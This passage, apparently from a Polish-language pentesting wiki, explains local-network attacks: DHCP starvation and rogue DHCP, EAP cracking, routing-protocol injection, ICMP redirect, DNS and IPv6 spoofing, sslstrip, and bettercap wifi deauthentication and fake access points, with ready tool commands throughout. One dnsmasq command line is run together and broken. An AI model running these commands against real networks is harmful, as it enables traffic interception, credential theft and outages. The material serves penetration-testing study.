Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Istnieją **dwa rodzaje ataków typu DoS**, które można przeprowadzić przeciwko serwerom DHCP. Pierwszy polega na **symulowaniu wystarczającej liczby fałszywych hostów, aby zużyć wszystkie możliwe adresy IP**.\
Ten atak zadziała tylko wtedy, gdy można zobaczyć odpowiedzi serwera DHCP i ukończyć protokół (**Odkryj** (Komputer) --> **Oferta** (serwer) --> **Żądanie** (Komputer) --> **Potwierdzenie** (serwer)). Na przykład **nie jest to możliwe w sieciach Wifi**.

Innym sposobem przeprowadzenia ataku typu DoS na DHCP jest wysłanie **pakietu DHCP-RELEASE, używając jako źródła każdego możliwego adresu IP**. Wtedy serwer będzie sądził, że wszyscy zakończyli korzystanie z danego adresu IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Aby zrobić to bardziej automatycznie, użyj narzędzia [DHCPing](https://github.com/kamorin/DHCPig)

Możesz użyć wspomnianych ataków DoS, aby zmusić klientów do uzyskania nowych dzierżaw w środowisku i wyczerpać prawidłowe serwery, aby stały się nieodpowiedzialne. Dlatego gdy prawidłowe serwery spróbują ponownie połączyć się, **możesz serwować złośliwe wartości wspomniane w następnym ataku**.

#### Ustaw złośliwe wartości

Rogi serwer DHCP można skonfigurować, używając skryptu DHCP znajdującego się w `/usr/share/responder/DHCP.py`. Jest to przydatne do ataków sieciowych, takich jak przechwytywanie ruchu HTTP i poświadczeń, poprzez przekierowywanie ruchu do złośliwego serwera. Jednakże, ustawienie fałszywej bramy jest mniej skuteczne, ponieważ pozwala tylko na przechwytywanie ruchu wychodzącego z klienta, pomijając odpowiedzi od prawdziwej bramy. Zamiast tego, zaleca się ustawienie fałszywego serwera DNS lub WPAD dla bardziej skutecznego ataku.

Poniżej znajdują się opcje poleceń do konfigurowania fałszywego serwera DHCP:

* **Nasz adres IP (Reklama Bramy)**: Użyj `-i 10.0.0.100`, aby reklamować IP twojego urządzenia jako bramę.
* **Lokalna nazwa domeny DNS**: Opcjonalnie, użyj `-d example.org`, aby ustawić lokalną nazwę domeny DNS.
* **Oryginalny Router/Brama IP**: Użyj `-r 10.0.0.1`, aby określić adres IP prawidłowego routera lub bramy.
* **Główny adres IP serwera DNS**: Użyj `-p 10.0.0.100`, aby ustawić adres IP fałszywego serwera DNS, który kontrolujesz.
* **Drugi adres IP serwera DNS**: Opcjonalnie, użyj `-s 10.0.0.1`, aby ustawić drugi adres IP serwera DNS.
* **Maska podsieci lokalnej sieci**: Użyj `-n 255.255.255.0`, aby zdefiniować maskę podsieci dla lokalnej sieci.
* **Interfejs do ruchu DHCP**: Użyj `-I eth1`, aby nasłuchiwać ruchu DHCP na określonym interfejsie sieciowym.
* **Adres konfiguracji WPAD**: Użyj `-w “http://10.0.0.100/wpad.dat”`, aby ustawić adres konfiguracji WPAD, pomagając w przechwytywaniu ruchu sieciowego.
* **Podszywanie adresu IP domyślnej bramy**: Dodaj `-S`, aby podszyć adres IP domyślnej bramy.
* **Odpowiedź na wszystkie żądania DHCP**: Dodaj `-R`, aby sprawić, że serwer odpowie na wszystkie żądania DHCP, ale miej świadomość, że jest to głośne i może być wykryte.

Poprawne użycie tych opcji pozwala na skuteczne przechwytywanie ruchu sieciowego za pomocą fałszywego serwera DHCP.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto kilka taktyk ataku, które można wykorzystać przeciwko implementacjom 802.1X:

* Aktywne łamanie hasła metodą brute-force za pomocą EAP
* Atakowanie serwera RADIUS za pomocą zniekształconej zawartości EAP _(eksploity)_
* Przechwytywanie wiadomości EAP i offline łamanie hasła (EAP-MD5 i PEAP)
* Wymuszanie uwierzytelniania EAP-MD5 w celu ominięcia weryfikacji certyfikatu TLS
* Wstrzykiwanie złośliwego ruchu sieciowego podczas uwierzytelniania za pomocą koncentratora lub podobnego

Jeśli atakujący znajduje się między ofiarą a serwerem uwierzytelniania, może on próbować zdegradować (jeśli konieczne) protokół uwierzytelniania do EAP-MD5 i przechwycić próbę uwierzytelnienia. Następnie może on użyć metody brute-force do:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataki FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokołów sieciowych zaprojektowana do **tworzenia gorącego redundantnego systemu routingu**. Dzięki FHRP fizyczne routery mogą być połączone w pojedyncze urządzenie logiczne, co zwiększa tolerancję na awarie i pomaga rozłożyć obciążenie.

**Inżynierowie firmy Cisco Systems opracowali dwa protokoły FHRP, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Istnieją trzy wersje protokołu Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy są wysyłane do równorzędnych za pomocą portu 520 za pomocą UDP przez RIP i RIPv2, podczas gdy datagramy są nadawane do portu 521 za pomocą multicastu IPv6 przez RIPng. Wersja RIPv2 wprowadziła obsługę uwierzytelniania MD5. Z kolei wersja RIPng nie zawiera natywnego uwierzytelniania; zamiast tego polega na opcjonalnych nagłówkach IPsec AH i ESP w IPv6.

* **RIP i RIPv2:** Komunikacja odbywa się za pomocą datagramów UDP na porcie 520.
* **RIPng:** Wykorzystuje port UDP 521 do nadawania datagramów za pomocą multicastu IPv6.

Należy zauważyć, że RIPv2 obsługuje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania, polegając na nagłówkach IPsec AH i ESP w IPv6.

### Ataki EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokół routingu. **Jest to protokół wektorów odległości.** Jeśli brak jest **uwierzytelniania** i konfiguracji interfejsów pasywnych, **intruz** może zakłócić routing EIGRP i spowodować **zatrucie tablic routingu**. Ponadto sieć EIGRP (inaczej mówiąc, system autonomiczny) **jest płaska i nie ma podziału na strefy**. Jeśli **atakujący wstrzyknie trasę**, istnieje duże prawdopodobieństwo, że ta trasa **rozprzestrzeni się** w całym autonomicznym systemie EIGRP.

Aby zaatakować system EIGRP, konieczne jest **ustanowienie sąsiedztwa z prawidłowym routerem EIGRP**, co otwiera wiele możliwości, począwszy od podstawowej rekonesansu po różne wstrzyknięcia.

[**FRRouting**](https://frrouting.org/) pozwala wdrożyć **wirtualny router obsługujący BGP, OSPF, EIGRP, RIP i inne protokoły.** Wystarczy go wdrożyć na systemie atakującego, aby faktycznie udawać prawidłowy router w domenie routingu.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) posiada możliwości przechwytywania nadawanych komunikatów EIGRP (Enhanced Interior Gateway Routing Protocol). Umożliwia również wstrzykiwanie pakietów, które można wykorzystać do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **często stosuje się uwierzytelnianie MD5 w celu zapewnienia bezpiecznej komunikacji między routerami**. Jednakże to zabezpieczenie może zostać złamane za pomocą narzędzi takich jak Loki i John the Ripper. Narzędzia te są zdolne do przechwytywania i łamania haseł MD5, ujawniając klucz uwierzytelniania. Gdy klucz ten zostanie uzyskany, można go użyć do wprowadzenia nowych informacji o trasowaniu. Aby skonfigurować parametry trasy i ustalić skompromitowany klucz, wykorzystywane są karty _Injection_ i _Connection_.

* **Przechwytywanie i Łamanie Haseł MD5:** Narzędzia takie jak Loki i John the Ripper są używane w tym celu.
* **Konfigurowanie Parametrów Trasy:** Wykonywane jest to za pomocą karty _Injection_.
* **Ustawianie Skompromitowanego Klucza:** Klucz jest konfigurowany w karcie _Connection_.

### Inne Ogólne Narzędzia i Źródła

* [**Above**](https://github.com/c4s73r/Above): Narzędzie do skanowania ruchu sieciowego i znajdowania podatności
* Możesz znaleźć **więcej informacji na temat ataków sieciowych** [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Podszywanie**

Atakujący konfiguruje wszystkie parametry sieciowe (bramka, IP, DNS) nowego członka sieci, wysyłając fałszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Sprawdź [poprzednią sekcję](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyłaniu pakietu ICMP typu 1, kod 5, który wskazuje, że atakujący jest najlepszą drogą do osiągnięcia danego adresu IP. Następnie, gdy ofiara chce skontaktować się z tym adresem IP, pakiet zostanie wysłany przez atakującego.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### Podmiana DNS

Atakujący będzie rozwiązywał niektóre (lub wszystkie) domeny, o które prosi ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj własne DNS z dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne Bramy

Często istnieje wiele tras do systemów i sieci. Po zbudowaniu listy adresów MAC w lokalnej sieci, użyj _gateway-finder.py_ do zidentyfikowania hostów obsługujących przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Podrabianie LLMNR, NBT-NS i mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Dla lokalnego rozwiązywania nazw hostów, gdy zapytania DNS są nieudane, systemy Microsoft polegają na **Link-Local Multicast Name Resolution (LLMNR)** oraz na **NetBIOS Name Service (NBT-NS)**. Podobnie, **Apple Bonjour** oraz implementacje **zero-configuration w systemach Linux** wykorzystują **Multicast DNS (mDNS)** do odkrywania systemów w sieci. Ze względu na nieuwierzytelniony charakter tych protokołów oraz ich działanie poprzez UDP, wysyłanie komunikatów do wszystkich, mogą być wykorzystane przez atakujących, którzy chcą przekierować użytkowników do złośliwych usług.

Możesz podszywać się pod usługi, które są wyszukiwane przez hosty, używając narzędzia Responder do wysyłania fałszywych odpowiedzi.\
Dowiedz się więcej o [jak podszywać się pod usługi za pomocą Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Podrabianie WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przeglądarki zazwyczaj korzystają z protokołu **Web Proxy Auto-Discovery (WPAD)** do automatycznego pobierania ustawień proxy. Polega to na pobieraniu szczegółów konfiguracji z serwera, konkretnie poprzez adres URL, takiego jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klientów może nastąpić poprzez różne mechanizmy:

* Poprzez **DHCP**, gdzie odkrycie jest ułatwione poprzez wykorzystanie specjalnego wpisu kodu 252.
* Poprzez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w domenie lokalnej.
* Za pomocą **Microsoft LLMNR i NBT-NS**, które są mechanizmami zapasowymi używanymi w przypadkach, gdy zapytania DNS nie powiodą się.

Narzędzie Responder wykorzystuje ten protokół, działając jako **złośliwy serwer WPAD**. Wykorzystuje DHCP, DNS, LLMNR i NBT-NS, aby wprowadzić klientów w błąd i skłonić ich do połączenia się z nim. Aby zagłębić się w to, jak usługi mogą być podszywane za pomocą Responder, [sprawdź to](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Podrabianie urządzeń SSDP i UPnP](spoofing-ssdp-and-upnp-devices.md)

Możesz oferować różne usługi w sieci, aby **oszukać użytkownika** i skłonić go do podania **hasła w postaci zwykłego tekstu**. **Więcej informacji na temat tego ataku w** [**Podrabianie urządzeń SSDP i UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Podrabianie sąsiadów IPv6

Ten atak jest bardzo podobny do Podrabiania ARP, ale w świecie IPv6. Możesz sprawić, że ofiara uwierzy, iż adres IPv6 bramy ma MAC atakującego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Podrobienie/Przepełnienie Reklamy Routera IPv6

Niektóre systemy operacyjne domyślnie konfigurują bramę z pakietów RA wysyłanych w sieci. Aby ogłosić atakującego jako router IPv6, można użyć:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Podrabianie DHCP w IPv6

Domyślnie niektóre systemy operacyjne próbują skonfigurować DNS, czytając pakiet DHCPv6 w sieci. Następnie atakujący mógłby wysłać pakiet DHCPv6, aby skonfigurować siebie jako DNS. DHCP również dostarcza adres IPv6 ofierze.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fałszywa strona i wstrzyknięcie kodu JS)

## Ataki internetowe

### sslStrip

Podstawowo, co robi ten atak, to w przypadku gdy **użytkownik** próbuje **uzyskać dostęp** do strony **HTTP**, która jest **przekierowywana** na wersję **HTTPS**, **sslStrip** będzie **utrzymywał** połączenie **HTTP z** klientem i połączenie **HTTPS z** serwerem, dzięki czemu będzie mógł **przechwycić** połączenie w **czystym tekście**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Więcej informacji [tutaj](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy do obejścia HSTS

**Różnica** między **sslStrip+ a dns2proxy** a **sslStrip** polega na tym, że będą **przekierowywać** na przykład _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (zauważ dodatkowe "**w**") i ustawiać **adres tego domeny jako IP atakującego**. W ten sposób **klient** będzie **łączył się** z _**wwww.facebook.com**_ (atakujący), ale za kulisami **sslstrip+** będzie **utrzymywał** **rzeczywiste połączenie** za pośrednictwem https z **www.facebook.com**.

**Celem** tej techniki jest **unikanie HSTS**, ponieważ _**wwww**.facebook.com_ **nie** zostanie zapisane w **pamięci podręcznej** przeglądarki, dzięki czemu przeglądarka zostanie oszukana, aby wykonać **uwierzytelnianie Facebooka w protokole HTTP**.\
Zauważ, że aby przeprowadzić ten atak, ofiara musi spróbować uzyskać początkowy dostęp do [http://www.faceook.com](http://www.faceook.com), a nie https. Można to zrobić, modyfikując linki wewnątrz strony http.

Więcej informacji [tutaj](https://www.bettercap.org/legacy/#hsts-bypass), [tutaj](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [tutaj](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip lub sslStrip+ już nie działają. Dzieje się tak, ponieważ w przeglądarkach zapisane są reguły HSTS, więc nawet jeśli użytkownik pierwszy raz próbuje uzyskać dostęp do "ważnej" domeny, uzyska do niej dostęp za pośrednictwem HTTPS. Zauważ również, że zapisane reguły i inne generowane reguły mogą używać flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **więc przykład z _**wwww.facebook.com**_ sprzed chwili już nie zadziała, ponieważ** _**facebook.com**_ **korzysta z HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Nasłuchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Nasłuch TCP + SSL na porcie

#### Generowanie kluczy i samopodpisanego certyfikatu
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Słuchaj za pomocą certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Słuchaj za pomocą certyfikatu i przekieruj do hostów
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeśli klient sprawdza, czy CA jest ważne, możesz **udostępnić certyfikat innego hosta podpisany przez CA**.\
Innym interesującym testem jest udostępnienie **certyfikatu żądanego hosta, ale samopodpisanego**.

Inne rzeczy do przetestowania to próba podpisania certyfikatu ważnym certyfikatem, który nie jest ważnym CA. Lub użycie ważnego klucza publicznego, zmuszenie do użycia algorytmu takiego jak Diffie-Hellman (który nie wymaga odszyfrowania niczego za pomocą prawdziwego klucza prywatnego) i gdy klient żąda sondy prawdziwego klucza prywatnego (jak skrótu), wysłanie fałszywej sondy i oczekiwanie, że klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktywne notatki dotyczące odkrywania

Należy wziąć pod uwagę, że gdy pakiet UDP jest wysyłany do urządzenia, które nie ma żądanego portu, wysyłany jest ICMP (Port Unreachable).

### **Odkrywanie ARP**

Pakiety ARP są używane do odkrywania, które adresy IP są używane w sieci. Komputer musi wysłać żądanie dla każdego możliwego adresu IP, a tylko te, które są używane, odpowiedzą.

### **mDNS (multicast DNS)**

Bettercap wysyła żądanie MDNS (co X ms) pytając o **\_services\_.dns-sd.\_udp.local**. Maszyna, która widzi ten pakiet, zazwyczaj odpowiada na to żądanie. Następnie wyszukuje tylko maszyny odpowiadające na "services".

**Narzędzia**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap wysyła pakiety rozgłoszeniowe do portu 137/UDP pytając o nazwę "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap wysyła pakiety SSDP rozgłaszając poszukiwanie wszelkiego rodzaju usług (Port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap wysyła pakiety WSD rozgłaszając poszukiwanie usług (Port UDP 3702).

## Odnośniki

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie **Intigriti**, premium platformie **bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
